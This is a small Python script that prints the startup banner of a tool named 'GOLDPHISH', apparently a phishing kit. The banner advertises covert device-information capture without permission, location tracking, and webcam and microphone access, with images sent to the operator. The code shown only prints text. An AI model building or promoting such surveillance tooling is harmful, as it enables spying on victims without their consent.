from colorama import Fore,Back,Style
import platform,os

OsName = platform.uname()[0]

def banner():
    if OsName == "Windows":
      os.system("cls")
    else:
      os.system("clear")
    print(Fore.LIGHTWHITE_EX+"WELCOME TO GOLDPHISH!")   
    print(Fore.LIGHTWHITE_EX+"**FEATURES**")  
    print(Fore.LIGHTWHITE_EX+"• Obtain Device Information Without Any Permission !")
    print(Fore.LIGHTWHITE_EX+"• Access Location [SMARTPHONES ONLY]")
    print(Fore.LIGHTWHITE_EX+"• Access Webcam and directly send the image to you!")
    print(Fore.LIGHTWHITE_EX+"• Access Microphone")

    print(Style.RESET_ALL)

banner()
